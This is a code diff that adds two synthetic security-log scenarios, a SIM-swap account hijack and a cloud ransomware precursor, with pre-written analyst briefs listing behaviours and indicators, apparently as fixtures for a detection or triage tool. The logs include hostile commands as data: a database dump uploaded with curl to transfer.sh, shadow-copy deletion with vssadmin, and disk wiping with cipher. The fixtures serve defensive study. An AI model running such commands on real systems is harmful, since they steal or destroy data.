@@ -467,6 +467,25 @@ sample_logs = {
 2026-05-11T08:31:42Z applicant=remote.engineer.17 resume_signal=overlapping_employment verification_status=unverified requested_access=vpn,router_admin
 2026-05-11T08:40:12Z worker=contractor.mills login_location_change=US_to_RU time_window_minutes=15 device_status=new-device
 2026-05-11T08:44:19Z user=contractor.mills oauth_app_consent app=UnknownMailSync permissions=Mail.Read offline_access
+""",
+
+    "SIM Swap & Hijack Case": """
+2026-05-12T09:12:05Z source=telecom_signaling protocol=SS7 event=anyTimeInterrogation subscriber_msisdn=15550199283 request_origin=foreign_network
+2026-05-12T09:14:12Z source=HLR event=sim_update subscriber_msisdn=15550199283 old_imsi=310260123456789 new_imsi=310260987654321 status=success
+2026-05-12T09:17:44Z source=IAM event=password_reset_request user=it.director status=requested method=SMS_OTP
+2026-05-12T09:18:10Z source=IAM event=password_reset_success user=it.director method=SMS_OTP source_ip=198.51.100.75
+2026-05-12T09:20:30Z source=SIEM event=vpn_login user=it.director status=success source_ip=198.51.100.75 country=BR device=unrecognized-macbook
+2026-05-12T09:24:15Z host=PROD-DB-01 process=pg_dump.exe command="pg_dump -U postgres main_prod > backup.sql" user=it.director
+2026-05-12T09:28:50Z host=PROD-DB-01 process=curl.exe command="curl -T backup.sql https://transfer.sh/" user=it.director
+""",
+
+    "Cloud Infrastructure Ransomware": """
+2026-05-12T14:02:11Z source=CloudTrail event=ConsoleLogin user=admin.cloud status=success source_ip=203.0.113.110 country=CN MFA=disabled
+2026-05-12T14:05:40Z source=CloudTrail event=UpdateTrail name=primary-audit-trail status=stopped user=admin.cloud
+2026-05-12T14:10:15Z source=CloudTrail event=CreateVirtualMachine user=admin.cloud count=12 instance_type=c5.metal region=us-east-1
+2026-05-12T14:15:33Z source=CloudTrail event=DeleteVaultKey vault=prod-kms-key user=admin.cloud status=success
+2026-05-12T14:18:50Z host=DEVEL-SRV-02 process=vssadmin.exe command="vssadmin delete shadows /all /quiet" user=SYSTEM
+2026-05-12T14:20:02Z host=DEVEL-SRV-02 process=cipher.exe command="cipher /w:C:\" user=SYSTEM
 """
 }
 
@@ -550,6 +569,45 @@ pre_extracted_briefs = {
             "Applicant Profile: remote.engineer.17",
             "Application: UnknownMailSync",
             "OAuth Permission: Mail.Read, offline_access"
+        ]
+    },
+    "SIM Swap & Hijack Case": {
+        "summary": "A sophisticated subscriber targeted attack was identified starting with SS7 location queries (AnyTimeInterrogation) followed by a successful SIM Swap (sim_update) on the victim's mobile number. The attacker subsequently requested an SMS OTP password reset to hijack the corporate account of the 'it.director'. A VPN login was then established from a foreign IP (Brazil), leading to database credential dumping via pg_dump and exfiltration over curl to a public sharing service.",
+        "behaviors": [
+            "Anomalous SS7 signaling location query targeting a specific subscriber.",
+            "SIM update (SIM swap) completed in HLR database.",
+            "SMS OTP password reset requested and approved within minutes.",
+            "Anomalous VPN authentication from a Brazilian IP using the hijacked it.director credentials.",
+            "Database dump execution using pg_dump.exe on CORP-DB-01.",
+            "Data exfiltration to external sharing service transfer.sh using curl.exe."
+        ],
+        "iocs": [
+            "MSISDN: 15550199283",
+            "IP: 198.51.100.75 (Brazil)",
+            "Account: it.director",
+            "Host: PROD-DB-01",
+            "Process: pg_dump.exe",
+            "Process: curl.exe",
+            "Domain: transfer.sh"
+        ]
+    },
+    "Cloud Infrastructure Ransomware": {
+        "summary": "An adversary compromised the privileged 'admin.cloud' role, logging in without MFA from a Chinese IP. The attacker disabled auditing (UpdateTrail stopped), provisioned multiple massive crypto-mining VMs (c5.metal), and deleted the product KMS key vault. On internal host DEVEL-SRV-02, the attacker deleted volume shadow copies (vssadmin) and ran cipher to wipe storage, indicating prep work for ransomware deployment.",
+        "behaviors": [
+            "Console login with MFA disabled from a foreign IP (China).",
+            "Audit log trail logging stopped (UpdateTrail).",
+            "Provisioning of 12 c5.metal high-performance compute instances.",
+            "Destruction of production KMS cryptographic key vault.",
+            "Deletion of volume shadow copies (vssadmin delete shadows) to inhibit system recovery.",
+            "Wiping storage empty space using cipher.exe command."
+        ],
+        "iocs": [
+            "IP: 203.0.113.110 (China)",
+            "Account: admin.cloud",
+            "Key Vault: prod-kms-key",
+            "Host: DEVEL-SRV-02",
+            "Process: vssadmin.exe",
+            "Process: cipher.exe"
         ]
     }
 }
